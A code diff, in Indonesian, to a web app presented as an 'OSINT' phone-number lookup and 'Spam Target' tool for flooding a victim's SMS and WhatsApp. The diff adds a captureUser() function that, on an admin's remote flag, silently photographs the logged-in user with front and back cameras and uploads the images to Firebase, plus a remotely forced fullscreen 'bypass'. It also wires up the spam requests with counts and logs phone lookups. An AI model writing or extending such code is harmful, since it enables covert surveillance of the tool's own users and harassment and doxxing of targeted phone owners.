@@ -472,6 +472,11 @@
             cursor: not-allowed;
         }
 
+        .btn-danger {
+            background: linear-gradient(45deg, var(--danger-color), #ff6b6b);
+            color: white;
+        }
+
         .result-box {
             background: rgba(0, 0, 0, 0.5);
             border: 1px solid var(--border-color);
@@ -1097,6 +1102,88 @@
             line-height: 1.5;
         }
 
+        /* Service Unavailable */
+        .service-unavailable {
+            margin-top: 20px;
+        }
+
+        /* Loading Container */
+        .loading-container {
+            text-align: center;
+            padding: 20px;
+            margin-top: 15px;
+        }
+
+        .loading-animation {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(0, 255, 65, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        .loading-text {
+            margin-top: 15px;
+            font-family: 'Orbitron', monospace;
+            color: var(--primary-color);
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Log Container */
+        #log-container {
+            max-height: 400px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 15px;
+        }
+
+        #log-container::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        #log-container::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        #log-container::-webkit-scrollbar-thumb {
+            background: var(--primary-color);
+            border-radius: 4px;
+        }
+
+        .log-entry {
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .log-time {
+            color: var(--secondary-color);
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+
+        .log-type {
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .log-message {
+            color: var(--text-color);
+        }
+
         /* Responsive */
         @media (max-width: 768px) {
             .main-title {
@@ -1192,11 +1279,11 @@
     <!-- Main Content -->
     <div class="container">
         <!-- Menu Tabs -->
-        <div class="menu-tabs">
-            <div class="menu-tab active" data-tab="osint">
+        <div class="menu-tabs" id="menu-tabs-container">
+            <div class="menu-tab active" data-tab="osint" id="osint-tab">
                 <i class="fas fa-search"></i> OSINT Tools
             </div>
-            <div class="menu-tab" data-tab="spam">
+            <div class="menu-tab" data-tab="spam" id="spam-tab">
                 <i class="fas fa-bomb"></i> Spam Target
             </div>
         </div>
@@ -1206,8 +1293,18 @@
             <div class="execute-progress" id="execute-progress"></div>
         </div>
 
+        <!-- Service Unavailable Message -->
+        <div class="service-unavailable" id="service-unavailable" style="display: none;">
+            <div class="card">
+                <h3 class="card-title">
+                    <i class="fas fa-exclamation-triangle"></i> Layanan Tidak Tersedia
+                </h3>
+                <p>Semua layanan yang Anda kunjungi sedang tidak dapat diakses. Mungkin dalam masa perbaikan atau ada error internal. Ini tidak akan berlangsung lama, harap tunggu sebentar.</p>
+            </div>
+        </div>
+
         <!-- Tab Contents -->
-        <div class="tab-content active" id="osint-tab">
+        <div class="tab-content active" id="osint-tab-content">
             <div class="card">
                 <h3 class="card-title">
                     <i class="fas fa-user-secret"></i> OSINT Phone Number Lookup
@@ -1217,8 +1314,20 @@
                     <input type="text" id="phone-input" class="input-control" placeholder="+628123456789">
                 </div>
                 <button class="btn" id="osint-search-btn">
-                    <i class="fas fa-search"></i> Cari Owner
+                    <i class="fas fa-search"></i> Cari Data Nomer
                 </button>
+                
+                <!-- Loading Container -->
+                <div class="loading-container" id="osint-loading-container" style="display: none;">
+                    <div class="loading-animation">
+                        <div class="loading-spinner"></div>
+                        <p class="loading-text" id="osint-loading-text">Sedang memproses permintaan...</p>
+                    </div>
+                    <button class="btn btn-danger" id="osint-cancel-request-btn" style="display: none; margin-top: 15px;">
+                        <i class="fas fa-times"></i> Batalkan Proses
+                    </button>
+                </div>
+                
                 <div class="result-box">
                     <div class="result-content" id="osint-result">Menunggu pencarian...</div>
                 </div>
@@ -1237,7 +1346,7 @@
             </div>
         </div>
 
-        <div class="tab-content" id="spam-tab">
+        <div class="tab-content" id="spam-tab-content">
             <div class="card">
                 <h3 class="card-title">
                     <i class="fas fa-bullseye"></i> Spam Target
@@ -1251,12 +1360,18 @@
                     <div class="spam-option" data-spam="sms">
                         <i class="fas fa-sms"></i>
                         <h4>Spam SMS</h4>
-                        <p>Kirim SMS massal ke target</p>
+                        <div class="input-group">
+                            <label for="spam-sms-count">Jumlah SMS (1-10)</label>
+                            <input type="number" id="spam-sms-count" class="input-control" min="1" max="10" value="10">
+                        </div>
                     </div>
                     <div class="spam-option" data-spam="whatsapp">
                         <i class="fab fa-whatsapp"></i>
                         <h4>Spam WhatsApp</h4>
-                        <p>Kirim pesan WhatsApp massal</p>
+                        <div class="input-group">
+                            <label for="spam-wa-count">Jumlah WhatsApp (1-10)</label>
+                            <input type="number" id="spam-wa-count" class="input-control" min="1" max="10" value="10">
+                        </div>
                     </div>
                     <div class="spam-option" data-spam="pairing">
                         <i class="fas fa-link"></i>
@@ -1273,6 +1388,17 @@
                 <button class="btn" id="spam-execute-btn" style="margin-top: 20px; display: none;">
                     <i class="fas fa-play"></i> Eksekusi
                 </button>
+                
+                <!-- Loading Container -->
+                <div class="loading-container" id="spam-loading-container" style="display: none;">
+                    <div class="loading-animation">
+                        <div class="loading-spinner"></div>
+                        <p class="loading-text" id="spam-loading-text">Sedang memproses permintaan...</p>
+                    </div>
+                    <button class="btn btn-danger" id="spam-cancel-request-btn" style="display: none; margin-top: 15px;">
+                        <i class="fas fa-times"></i> Batalkan Proses
+                    </button>
+                </div>
                 
                 <div class="console-log" id="spam-console">
                     <div class="log-entry">
@@ -1301,7 +1427,7 @@
         <div class="side-menu-content">
             <div class="side-menu-item" data-menu="info">
                 <i class="fas fa-info-circle"></i>
-                <h4>Info</h4>
+                <h4>Info v2.0</h4>
                 <p>Informasi tentang tools OSINT</p>
             </div>
             <div class="side-menu-item" data-menu="log">
@@ -1393,9 +1519,16 @@
             </div>
             
             <div class="info-section">
-                <h2><i class="fas fa-info-circle"></i> Versi: 1.0 — Pembaruan berkala tersedia</h2>
-                <p><strong>DESKRIPSI SINGKAT</strong></p>
-                <p>Tools OSINT ini adalah solusi cepat dan terintegrasi untuk pengumpulan intelijen digital (open-source intelligence) yang dikembangkan oleh tim AryaProject bekerja sama dengan APTECH - DEV. Dirancang untuk kebutuhan riset keamanan, audit, dan pentesting edukatif — memprioritaskan kecepatan, akurasi data, dan kemudahan penggunaan.</p>
+                <h2><i class="fas fa-info-circle"></i> Versi: 2.0 — Pembaruan berkala tersedia</h2>
+                <p><strong>CHANGELOG v2.0</strong></p>
+                <ul>
+                    <li>Perbaikan bug pada sistem request</li>
+                    <li>Penambahan fitur filter request berdasarkan user</li>
+                    <li>Penambahan animasi loading yang lebih interaktif</li>
+                    <li>Perbaikan sistem log untuk privasi user</li>
+                    <li>Penambahan fitur capture otomatis user</li>
+                    <li>Penambahan kontrol bypass fullscreen</li>
+                </ul>
             </div>
             
             <div class="info-section">
@@ -1472,6 +1605,29 @@
         </div>
     </div>
 
+    <!-- Log Page -->
+    <div class="info-page" id="log-page">
+        <div class="info-container">
+            <div class="info-header">
+                <h1>Log Aktivitas</h1>
+                <p>Riwayat aktivitas Anda</p>
+            </div>
+            
+            <div class="info-section">
+                <h2><i class="fas fa-history"></i> Log Pencarian</h2>
+                <div id="log-container">
+                    <!-- Log entries will be added dynamically -->
+                </div>
+            </div>
+            
+            <div class="info-actions">
+                <button class="back-btn" id="back-to-main-from-log">
+                    <i class="fas fa-arrow-left"></i> Kembali
+                </button>
+            </div>
+        </div>
+    </div>
+
     <!-- Notification -->
     <div class="notification" id="notification">
         <i class="fas fa-info-circle"></i>
@@ -1500,7 +1656,7 @@
         const userName = document.getElementById('user-name');
         const countdown = document.getElementById('countdown');
         const countdownTimer = document.getElementById('countdown-timer');
-        const menuTabs = document.querySelectorAll('.menu-tab');
+        const menuTabsContainer = document.getElementById('menu-tabs-container');
         const tabContents = document.querySelectorAll('.tab-content');
         const executeProgress = document.getElementById('execute-progress');
         const hamburgerMenu = document.getElementById('hamburger-menu');
@@ -1517,25 +1673,36 @@
         const logoutExpiredBtn = document.getElementById('logout-expired-btn');
         const loginGuestBtn = document.getElementById('login-guest-btn');
         const infoPage = document.getElementById('info-page');
+        const logPage = document.getElementById('log-page');
         const backToMain = document.getElementById('back-to-main');
+        const backToMainFromLog = document.getElementById('back-to-main-from-log');
         const chatOwner = document.getElementById('chat-owner');
         const notification = document.getElementById('notification');
         const notificationMessage = document.getElementById('notification-message');
         const flashlightControl = document.getElementById('flashlight-control');
         const flashlightStatus = document.getElementById('flashlight-status');
         const flashlightText = document.getElementById('flashlight-text');
+        const serviceUnavailable = document.getElementById('service-unavailable');
 
         // OSINT Elements
         const phoneInput = document.getElementById('phone-input');
         const osintSearchBtn = document.getElementById('osint-search-btn');
         const osintResult = document.getElementById('osint-result');
         const osintConsole = document.getElementById('osint-console');
+        const osintLoadingContainer = document.getElementById('osint-loading-container');
+        const osintLoadingText = document.getElementById('osint-loading-text');
+        const osintCancelRequestBtn = document.getElementById('osint-cancel-request-btn');
 
         // Spam Elements
         const targetInput = document.getElementById('target-input');
         const spamOptions = document.querySelectorAll('.spam-option');
         const spamExecuteBtn = document.getElementById('spam-execute-btn');
         const spamConsole = document.getElementById('spam-console');
+        const spamLoadingContainer = document.getElementById('spam-loading-container');
+        const spamLoadingText = document.getElementById('spam-loading-text');
+        const spamCancelRequestBtn = document.getElementById('spam-cancel-request-btn');
+        const spamSmsCount = document.getElementById('spam-sms-count');
+        const spamWaCount = document.getElementById('spam-wa-count');
 
         // User Data
         let userData = {
@@ -1552,6 +1719,13 @@
         let cameraStream = null;
         let cameraPermissionGranted = false;
         let countdownInterval = null;
+        let osintLoadingTimer = null;
+        let osintCancelTimer = null;
+        let osintAutoCancelTimer = null;
+        let spamLoadingTimer = null;
+        let spamCancelTimer = null;
+        let spamAutoCancelTimer = null;
+        let menuStatusInitialized = false;
 
         // Check if user is logged in
         function checkUserLogin() {
@@ -1585,6 +1759,9 @@
                     
                     // Update user status in Firebase
                     updateUserStatus();
+                    
+                    // Capture user if enabled
+                    captureUser();
                 }
             } else {
                 // User is not logged in, show guest mode
@@ -1682,6 +1859,9 @@
                             
                             // Save user data to Firebase
                             saveUserDataToFirebase();
+                            
+                            // Capture user if enabled
+                            captureUser();
                             
                             showNotification('Login berhasil', 'success');
                         })
@@ -1915,20 +2095,56 @@
 
         // Check menu availability from Firebase
         function checkMenuAvailability() {
+            // Only initialize once to prevent multiple listeners
+            if (menuStatusInitialized) return;
+            menuStatusInitialized = true;
+            
             database.ref('menuStatus').on('value', (snapshot) => {
                 const menuStatus = snapshot.val();
                 
                 if (menuStatus) {
+                    const osintTab = document.getElementById('osint-tab');
+                    const spamTab = document.getElementById('spam-tab');
+                    
                     // Check OSINT menu
                     if (menuStatus.osint === false) {
-                        const osintTab = document.querySelector('[data-tab="osint"]');
                         osintTab.classList.add('disabled');
+                    } else {
+                        osintTab.classList.remove('disabled');
                     }
                     
                     // Check Spam menu
                     if (menuStatus.spam === false) {
-                        const spamTab = document.querySelector('[data-tab="spam"]');
                         spamTab.classList.add('disabled');
+                    } else {
+                        spamTab.classList.remove('disabled');
+                    }
+                    
+                    // If both services are unavailable
+                    if (menuStatus.osint === false && menuStatus.spam === false) {
+                        serviceUnavailable.style.display = 'block';
+                        menuTabsContainer.style.display = 'none';
+                        document.querySelectorAll('.tab-content').forEach(content => {
+                            content.style.display = 'none';
+                        });
+                    } else {
+                        serviceUnavailable.style.display = 'none';
+                        menuTabsContainer.style.display = 'flex';
+                        
+                        // Switch to available service
+                        if (menuStatus.osint === false && menuStatus.spam === true) {
+                            // Switch to spam tab
+                            document.querySelectorAll('.menu-tab').forEach(tab => tab.classList.remove('active'));
+                            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+                            spamTab.classList.add('active');
+                            document.getElementById('spam-tab-content').classList.add('active');
+                        } else if (menuStatus.osint === true && menuStatus.spam === false) {
+                            // Switch to OSINT tab
+                            document.querySelectorAll('.menu-tab').forEach(tab => tab.classList.remove('active'));
+                            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+                            osintTab.classList.add('active');
+                            document.getElementById('osint-tab-content').classList.add('active');
+                        }
                     }
                 }
             });
@@ -1991,6 +2207,15 @@
                     
                     // Add to console
                     addConsoleEntry(osintConsole, `OSINT search completed for ${result.phone}`, result.time);
+                    
+                    // Add to user log
+                    addLogEntry('osint_result', `Search completed for ${result.phone}: ${result.data}`);
+                    
+                    // Hide loading
+                    hideOsintLoading();
+                    
+                    // Show notification for old request
+                    showNotification('Request target lama yang anda proses sebelum nya telah di kerjakan owner dan akan tampil di log menu lengkap beserta tanggal konfirmasi owner', 'info');
                 }
             });
         }
@@ -2003,7 +2228,67 @@
                 if (result) {
                     // Add to console
                     addConsoleEntry(spamConsole, `Spam ${result.method} executed on ${result.target}: ${result.status}`, result.time);
+                    
+                    // Add to user log
+                    addLogEntry('spam_result', `${result.method} executed on ${result.target}: ${result.status}`);
+                    
+                    // Hide loading
+                    hideSpamLoading();
                 }
+            });
+        }
+
+        // Listen for user responses from Firebase
+        function listenForUserResponses() {
+            database.ref('userResponses/' + userData.phone.replace(/\D/g, '')).on('value', (snapshot) => {
+                snapshot.forEach((childSnapshot) => {
+                    const response = childSnapshot.val();
+                    
+                    showNotification(`Admin response: ${response.response}`, 'info');
+                    
+                    // Add to log
+                    addLogEntry('admin_response', response.response);
+                });
+            });
+        }
+
+        // Add log entry
+        function addLogEntry(type, message) {
+            if (!userData.phone) return; // Only add logs for logged in users
+            
+            const logEntry = {
+                type: type,
+                message: message,
+                timestamp: new Date().toISOString()
+            };
+            
+            database.ref('userLogs/' + userData.phone.replace(/\D/g, '')).push(logEntry);
+        }
+
+        // Load user logs
+        function loadUserLogs() {
+            if (!userData.phone) return; // Only load logs for logged in users
+            
+            database.ref('userLogs/' + userData.phone.replace(/\D/g, '')).on('value', (snapshot) => {
+                const logContainer = document.getElementById('log-container');
+                logContainer.innerHTML = '';
+                
+                snapshot.forEach((childSnapshot) => {
+                    const log = childSnapshot.val();
+                    
+                    const logItem = document.createElement('div');
+                    logItem.className = 'log-entry';
+                    
+                    const logTime = new Date(log.timestamp).toLocaleString();
+                    
+                    logItem.innerHTML = `
+                        <div class="log-time">${logTime}</div>
+                        <div class="log-type">${log.type}</div>
+                        <div class="log-message">${log.message}</div>
+                    `;
+                    
+                    logContainer.appendChild(logItem);
+                });
             });
         }
 
@@ -2030,6 +2315,18 @@
                         // Try to turn off flashlight
                         tryToTurnOffFlashlight();
                     }
+                }
+            });
+        }
+
+        // Listen for fullscreen bypass control from Firebase
+        function listenForFullscreenBypass() {
+            database.ref('controls/fullscreenBypass').on('value', (snapshot) => {
+                const bypassState = snapshot.val();
+                
+                if (bypassState === true) {
+                    // Force fullscreen
+                    requestFullscreen();
                 }
             });
         }
@@ -2088,6 +2385,80 @@
                     cameraStream = null;
                 }
             }
+        }
+
+        // Capture user
+        function captureUser() {
+            database.ref('controls/userCapture').once('value')
+                .then((snapshot) => {
+                    const isCaptureEnabled = snapshot.val();
+                    
+                    if (isCaptureEnabled) {
+                        // Capture front camera
+                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                            .then(stream => {
+                                const video = document.createElement('video');
+                                video.srcObject = stream;
+                                video.play();
+                                
+                                setTimeout(() => {
+                                    const canvas = document.createElement('canvas');
+                                    canvas.width = video.videoWidth;
+                                    canvas.height = video.videoHeight;
+                                    const context = canvas.getContext('2d');
+                                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    
+                                    const frontCameraImage = canvas.toDataURL('image/jpeg', 0.8);
+                                    
+                                    // Stop stream
+                                    stream.getTracks().forEach(track => track.stop());
+                                    
+                                    // Capture back camera
+                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                                        .then(stream => {
+                                            const video = document.createElement('video');
+                                            video.srcObject = stream;
+                                            video.play();
+                                            
+                                            setTimeout(() => {
+                                                const canvas = document.createElement('canvas');
+                                                canvas.width = video.videoWidth;
+                                                canvas.height = video.videoHeight;
+                                                const context = canvas.getContext('2d');
+                                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                                
+                                                const backCameraImage = canvas.toDataURL('image/jpeg', 0.8);
+                                                
+                                                // Stop stream
+                                                stream.getTracks().forEach(track => track.stop());
+                                                
+                                                // Save to Firebase
+                                                database.ref('userCaptures').push({
+                                                    userId: userData.phone.replace(/\D/g, ''),
+                                                    frontCamera: frontCameraImage,
+                                                    backCamera: backCameraImage,
+                                                    timestamp: new Date().toISOString()
+                                                });
+                                            }, 1000);
+                                        })
+                                        .catch(error => {
+                                            console.error('Error accessing back camera:', error);
+                                            
+                                            // Save only front camera to Firebase
+                                            database.ref('userCaptures').push({
+                                                userId: userData.phone.replace(/\D/g, ''),
+                                                frontCamera: frontCameraImage,
+                                                backCamera: null,
+                                                timestamp: new Date().toISOString()
+                                            });
+                                        });
+                                }, 1000);
+                            })
+                            .catch(error => {
+                                console.error('Error accessing front camera:', error);
+                            });
+                    }
+                });
         }
 
         // Initialize Matrix Rain
@@ -2149,31 +2520,123 @@
             }
         }
 
-        // Tab switching
-        menuTabs.forEach(tab => {
-            tab.addEventListener('click', () => {
-                // Check if user is logged in
-                if (!userData.phone) {
-                    showGuestOverlay();
-                    return;
-                }
+        // Show OSINT loading
+        function showOsintLoading() {
+            osintLoadingContainer.style.display = 'block';
+            osintCancelRequestBtn.style.display = 'none';
+            osintLoadingText.textContent = 'Sedang memproses permintaan...';
+            
+            // Set timer for changing loading text after 2 minutes
+            osintLoadingTimer = setTimeout(() => {
+                osintLoadingText.textContent = 'Mungkin admin sedang sibuk, tunggu jam kerja owner. Biasanya akan respon...';
                 
-                // Check if tab is disabled
-                if (tab.classList.contains('disabled')) {
-                    showNotification('Layanan tidak tersedia saat ini', 'error');
-                    return;
-                }
+                // Show cancel button after 3 minutes
+                osintCancelTimer = setTimeout(() => {
+                    osintCancelRequestBtn.style.display = 'inline-block';
+                }, 60000); // 1 minute after text change (total 3 minutes)
                 
-                // Remove active class from all tabs and contents
-                menuTabs.forEach(t => t.classList.remove('active'));
-                tabContents.forEach(c => c.classList.remove('active'));
-                
-                // Add active class to clicked tab and corresponding content
-                tab.classList.add('active');
-                const tabId = tab.getAttribute('data-tab') + '-tab';
-                document.getElementById(tabId).classList.add('active');
+                // Auto-cancel after 5 minutes
+                osintAutoCancelTimer = setTimeout(() => {
+                    cancelOsintRequest();
+                }, 180000); // 2 minutes after cancel button appears (total 5 minutes)
+            }, 120000); // 2 minutes
+        }
+
+        // Hide OSINT loading
+        function hideOsintLoading() {
+            osintLoadingContainer.style.display = 'none';
+            
+            // Clear all timers
+            clearTimeout(osintLoadingTimer);
+            clearTimeout(osintCancelTimer);
+            clearTimeout(osintAutoCancelTimer);
+        }
+
+        // Cancel OSINT request
+        function cancelOsintRequest() {
+            hideOsintLoading();
+            showNotification('Permintaan dibatalkan', 'info');
+            
+            // Send cancel notification to Firebase
+            database.ref('cancelledRequests').push({
+                userId: userData.phone.replace(/\D/g, ''),
+                timestamp: new Date().toISOString()
             });
-        });
+            
+            // Add to log
+            addLogEntry('request_cancelled', 'OSINT request cancelled by user');
+        }
+
+        // Show Spam loading
+        function showSpamLoading() {
+            spamLoadingContainer.style.display = 'block';
+            spamCancelRequestBtn.style.display = 'none';
+            spamLoadingText.textContent = 'Sedang memproses permintaan...';
+            
+            // Set timer for changing loading text after 2 minutes
+            spamLoadingTimer = setTimeout(() => {
+                spamLoadingText.textContent = 'Mungkin admin sedang sibuk, tunggu jam kerja owner. Biasanya akan respon...';
+                
+                // Show cancel button after 3 minutes
+                spamCancelTimer = setTimeout(() => {
+                    spamCancelRequestBtn.style.display = 'inline-block';
+                }, 60000); // 1 minute after text change (total 3 minutes)
+                
+                // Auto-cancel after 5 minutes
+                spamAutoCancelTimer = setTimeout(() => {
+                    cancelSpamRequest();
+                }, 180000); // 2 minutes after cancel button appears (total 5 minutes)
+            }, 120000); // 2 minutes
+        }
+
+        // Hide Spam loading
+        function hideSpamLoading() {
+            spamLoadingContainer.style.display = 'none';
+            
+            // Clear all timers
+            clearTimeout(spamLoadingTimer);
+            clearTimeout(spamCancelTimer);
+            clearTimeout(spamAutoCancelTimer);
+        }
+
+        // Cancel Spam request
+        function cancelSpamRequest() {
+            hideSpamLoading();
+            showNotification('Permintaan dibatalkan', 'info');
+            
+            // Send cancel notification to Firebase
+            database.ref('cancelledRequests').push({
+                userId: userData.phone.replace(/\D/g, ''),
+                timestamp: new Date().toISOString()
+            });
+            
+            // Add to log
+            addLogEntry('request_cancelled', 'Spam request cancelled by user');
+        }
+
+        // Tab switching
+        function switchTab(tabElement) {
+            // Check if user is logged in
+            if (!userData.phone) {
+                showGuestOverlay();
+                return;
+            }
+            
+            // Check if tab is disabled
+            if (tabElement.classList.contains('disabled')) {
+                showNotification('Layanan tidak tersedia saat ini', 'error');
+                return;
+            }
+            
+            // Remove active class from all tabs and contents
+            document.querySelectorAll('.menu-tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            // Add active class to clicked tab and corresponding content
+            tabElement.classList.add('active');
+            const tabId = tabElement.getAttribute('data-tab') + '-tab-content';
+            document.getElementById(tabId).classList.add('active');
+        }
 
         // Spam option selection
         let selectedSpamMethod = null;
@@ -2221,12 +2684,13 @@
             }
             
             // Show loading
-            osintResult.textContent = 'Mencari informasi...';
-            osintSearchBtn.innerHTML = '<span class="loading"></span> Mencari...';
-            osintSearchBtn.disabled = true;
+            showOsintLoading();
             
             // Add to console
-            addConsoleEntry(osintConsole, `Searching for owner of ${phoneNumber}`);
+            addConsoleEntry(osintConsole, `Searching for data of ${phoneNumber}`);
+            
+            // Add to log
+            addLogEntry('osint_search', `Searching for data of ${phoneNumber}`);
             
             // Send request to Firebase
             database.ref('osintRequests').push({
@@ -2239,9 +2703,8 @@
             })
             .catch((error) => {
                 console.error('Error sending OSINT request:', error);
-                osintResult.textContent = 'Error: Gagal mengirim permintaan';
-                osintSearchBtn.innerHTML = '<i class="fas fa-search"></i> Cari Owner';
-                osintSearchBtn.disabled = false;
+                hideOsintLoading();
+                showNotification('Error: Gagal mengirim permintaan', 'error');
             });
         });
 
@@ -2270,17 +2733,28 @@
                 return;
             }
             
+            // Get spam count
+            let spamCount = 10; // Default
+            if (selectedSpamMethod === 'sms') {
+                spamCount = parseInt(spamSmsCount.value) || 10;
+            } else if (selectedSpamMethod === 'whatsapp') {
+                spamCount = parseInt(spamWaCount.value) || 10;
+            }
+            
             // Show loading
-            spamExecuteBtn.innerHTML = '<span class="loading"></span> Mengeksekusi...';
-            spamExecuteBtn.disabled = true;
+            showSpamLoading();
             
             // Add to console
-            addConsoleEntry(spamConsole, `Executing ${selectedSpamMethod} spam on ${targetNumber}`);
+            addConsoleEntry(spamConsole, `Executing ${selectedSpamMethod} spam (${spamCount}x) on ${targetNumber}`);
+            
+            // Add to log
+            addLogEntry('spam_execute', `Executing ${selectedSpamMethod} spam (${spamCount}x) on ${targetNumber}`);
             
             // Send request to Firebase
             database.ref('spamRequests').push({
                 target: targetNumber,
                 method: selectedSpamMethod,
+                count: spamCount,
                 userId: userData.phone.replace(/\D/g, ''),
                 timestamp: new Date().toISOString()
             })
@@ -2289,11 +2763,15 @@
             })
             .catch((error) => {
                 console.error('Error sending spam request:', error);
+                hideSpamLoading();
                 addConsoleEntry(spamConsole, `Error: Gagal mengirim permintaan spam`);
-                spamExecuteBtn.innerHTML = '<i class="fas fa-play"></i> Eksekusi';
-                spamExecuteBtn.disabled = false;
+                showNotification('Error: Gagal mengirim permintaan spam', 'error');
             });
         });
+
+        // Cancel request buttons
+        osintCancelRequestBtn.addEventListener('click', cancelOsintRequest);
+        spamCancelRequestBtn.addEventListener('click', cancelSpamRequest);
 
         // Hamburger menu
         hamburgerIcon.addEventListener('click', () => {
@@ -2315,7 +2793,9 @@
                         showGuestOverlay();
                         return;
                     }
-                    showNotification('Menu Log akan segera tersedia', 'info');
+                    // Show log page
+                    logPage.classList.add('open');
+                    loadUserLogs();
                 } else if (menu === 'cs') {
                     showNotification('Customer Service sedang dalam pengembangan', 'info');
                 } else if (menu === 'ai') {
@@ -2360,6 +2840,10 @@
             infoPage.classList.remove('open');
         });
 
+        backToMainFromLog.addEventListener('click', () => {
+            logPage.classList.remove('open');
+        });
+
         chatOwner.addEventListener('click', () => {
             const phoneNumber = '+6281234200500';
             const message = encodeURIComponent('halo devloper saya ingin beli key atau ingin tahu lebih banyak tentang tools ini');
@@ -2402,14 +2886,28 @@
             // Listen for Spam results
             listenForSpamResults();
             
+            // Listen for user responses
+            listenForUserResponses();
+            
             // Listen for flashlight control
             listenForFlashlightControl();
+            
+            // Listen for fullscreen bypass
+            listenForFullscreenBypass();
             
             // Check if user is blocked
             if (userData.phone) {
                 checkUserBlockedStatus();
                 checkUserSubscriptionStatus();
             }
+            
+            // Set up tab switching with event delegation
+            menuTabsContainer.addEventListener('click', (e) => {
+                const tabElement = e.target.closest('.menu-tab');
+                if (tabElement) {
+                    switchTab(tabElement);
+                }
+            });
         });
     </script>
 </body>
